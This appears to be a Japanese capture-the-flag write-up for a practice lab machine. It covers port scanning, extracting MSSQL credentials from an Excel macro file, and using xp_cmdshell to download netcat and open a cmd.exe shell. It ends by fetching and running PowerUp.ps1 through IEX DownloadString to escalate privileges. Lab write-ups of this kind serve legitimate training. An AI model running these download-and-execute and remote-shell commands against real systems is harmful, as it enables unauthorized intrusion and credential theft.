情報収集


nmapでポートスキャンを開始することから、探索を開始しましょう。

nmap –sC –Pn –A 10.10.10.125



見つかったポートを一覧表示します。

139/445 / tcp（smb）を列挙


smbclientユーティリティを使用して、SMBサーバーリソースにアクセスします。

smbclient –L //10.10.10.125

すべてのリソースを調べた後、Reportsディレクトリに「Currency Volume Report.xlsm」というファイルがあります。



このファイルを標準のMicrosoft Excelで開くと、一見すると完全に空の状態で表示されます。binwalk

ユーティリティを使用してファイルを分析します。これは、xlsmドキュメントの埋め込みファイルを確認するのに役立ちます。 binwalkの出力から、xlsmに含まれるいくつかの興味深いファイルが見つかりました。 –eフラグを使用して、解凍します。






binwalk –e Currency\ Volume\ Report.xlsm



次に、文字列ユーティリティを使用して、印刷された文字を出力します。ファイルを調べると、vbaProject.binに興味深いデータが見つかります。mssqlサーバーの資格情報を見つけたようです。



現在受け取っている情報を要約するには：

  • mssqlサーバーがポート10.10.10.125:1433で回転していることがわかります。
  • mssqlサーバーユーザーからの資格情報があります。

では、impacketモジュールのスクリプトを使用してサーバーに接続してみましょう。

python mssqlclient.py QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth

MsSQLへのアクセスを取得します。

リバースシェルを入手する


netcatを介してシェルを取得しようとしています。これには、攻撃されたサーバーにアップロードする必要があります。

netcatが置かれているマシンのディレクトリに移動して実行します。

python –m SimpleHTTPServer

mssqlシェルでnetcat（nc.exe）をリモートサーバーにダウンロードするには、保存パスを指定してpowershellコマンドを実行します。

xp_cmdshell "powershell.exe Invoke-WebRequest "http://10.10.x.x:8000/nc.exe" –
OutFile "C:\Users\mssql-svc\Desktop\nc.exe" "

netcatを起動して、ポート4444で待機します。

xp_cmdshell "powershell C:/Users/mssql-svc/Desktop/nc.exe -l -p 4444 -e cmd.exe"

攻撃対象のサーバーのIPとポートを指定してnetcatを起動し、シェルを取得します。

nc 10.10.10.125 4444

PowerShellMafiaからスクリプトを 実行して、権限を増やします。

powershell.exe IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.x.x:8000/PowerUp.ps1\"); Invoke-AllChecks



スクリプトの結果、管理者の資格情報を取得しました。

新しい認証情報と権限でsmbリソースに移動します。
